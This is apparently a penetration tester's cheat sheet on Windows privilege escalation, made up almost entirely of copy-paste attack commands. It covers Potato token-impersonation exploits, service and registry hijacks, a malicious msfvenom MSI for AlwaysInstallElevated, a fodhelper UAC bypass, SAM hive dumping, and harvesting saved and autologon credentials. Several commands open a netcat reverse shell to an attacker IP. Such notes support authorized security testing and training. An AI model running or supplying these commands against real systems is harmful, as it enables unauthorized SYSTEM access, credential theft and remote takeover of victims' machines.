# 05 - Windows Privilege Escalation

[⬅️ Back to Master Index](README.md)

---

## 📌 1. Automated Enumeration Tools

```cmd
:: WinPEAS (Comprehensive system and registry auditor)
winPEASany.exe quiet cmd

:: Seatbelt (.NET host auditing tool across security categories)
Seatbelt.exe -group=system
Seatbelt.exe -group=user

:: PowerUp (PowerShell privilege escalation script)
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

:: SharpUp (C# equivalent of PowerUp)
SharpUp.exe audit
```

---

## 🔍 2. Manual System Audit Checklist

```cmd
:: Current user identity, SID, and assigned privileges
whoami /all
whoami /priv

:: Operating System details and hotfix status
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

:: Local users and group memberships
net user
net localgroup Administrators

:: Internal listening ports (Check for local database or proxy services)
netstat -ano | findstr LISTENING

:: Stored credentials in Windows Vault
cmdkey /list

:: Running processes with service associations
tasklist /SVC
```

---

## 🥔 3. Token Impersonation (The Potato Family)

If `whoami /priv` displays **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`** enabled (standard for service accounts like `iis apppool\defaultapppool` or `nt service\mssql$sqlexpress`):

### 1. PrintSpoofer (Windows 10 / Server 2016 & 2019)
Abuses the Print Spooler service to impersonate SYSTEM:
```cmd
:: Interactive cmd prompt as SYSTEM
PrintSpoofer64.exe -i -c cmd.exe

:: Execute command or reverse shell
PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 192.168.100.5 4444 -e cmd.exe"
```

### 2. GodPotato (Windows 10 / 11 / Server 2012 through 2022)
Modern universal DCOM potato exploit utilizing `.NET`:
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe 192.168.100.5 4444 -e cmd.exe"
```

### 3. JuicyPotato (Legacy Windows 7 / 8 / Server 2012 / Server 2016)
```cmd
:: Syntax: JuicyPotato.exe -l [port] -p [executable] -t * -c [CLSID]
JuicyPotato.exe -l 1337 -p C:\Users\Public\shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

---

## 🛠️ 4. Windows Service Misconfigurations

### 1. Unquoted Service Paths
Occurs when a service executable path contains spaces and lacks quotation marks.

#### Detection:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
*Example vulnerable path: `C:\Program Files\Vulnerable Service\agent.exe`*

#### Exploitation:
Windows will attempt to execute binaries in the following order:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Service\agent.exe`

If you have write permissions to `C:\Program Files\`:
```cmd
:: Copy reverse shell payload to intercept execution
copy C:\Users\Public\shell.exe "C:\Program Files\Vulnerable.exe"

:: Restart the service or reboot
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

### 2. Insecure Service Permissions (Weak ACLs)
If a low-privilege user has `SERVICE_CHANGE_CONFIG` permissions:

#### Detection with AccessChk:
```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
```

#### Exploitation:
```cmd
:: Reconfigure service binary path to execute your reverse shell
sc config "VulnService" binpath= "C:\Users\Public\nc.exe 192.168.100.5 4444 -e cmd.exe"

:: Restart the service to trigger execution as SYSTEM
sc stop "VulnService"
sc start "VulnService"
```

### 3. Weak Service Registry Permissions
If permissions on the registry key `HKLM\System\CurrentControlSet\Services\<ServiceName>` allow modification:
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## 📦 5. AlwaysInstallElevated (MSI Execution)

If both Local Machine and Current User registry keys have `AlwaysInstallElevated` set to `1`:

### Detection:
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation:
1. Generate a malicious MSI package on Kali:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f msi -o install.msi
   ```
2. Execute the installer quietly on the target host (executes as `NT AUTHORITY\SYSTEM`):
   ```cmd
   msiexec /quiet /qn /i install.msi
   ```

---

## 🔑 6. Stored Credentials & Hash Extraction

### 1. Windows Autologon Registry Credentials
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Check for: DefaultUserName, DefaultDomainName, DefaultPassword
```

### 2. Saved Credentials with `runas`
If `cmdkey /list` reveals stored credentials:
```cmd
cmdkey /list
:: Target: WindowsLive:target=... / Type: Domain Password / User: CORP\admin

:: Execute commands using the saved credentials
runas /savecred /user:CORP\admin "cmd.exe /c C:\Users\Public\nc.exe 192.168.100.5 4444 -e cmd.exe"
```

### 3. Unattended Installation Files
Search for cleartext passwords in configuration files:
```cmd
dir /s /b C:\*unattend*.xml
dir /s /b C:\*sysprep*.xml
type C:\Windows\Panther\Unattend.xml
```

### 4. Dumping Local SAM and SYSTEM Hives (Requires Admin / Backup Privileges)
```cmd
reg save HKLM\SAM C:\Users\Public\sam.save
reg save HKLM\SYSTEM C:\Users\Public\system.save

:: Extract local hashes on Kali:
secretsdump.py -sam sam.save -system system.save LOCAL
```

---

## 🛡️ 7. UAC (User Account Control) Bypass

When operating as a local administrator within a medium-integrity context (`whoami /groups` lists `High Mandatory Level` as missing):

### 1. Fodhelper UAC Bypass (Windows 10)
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe /c C:\Users\Public\shell.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```
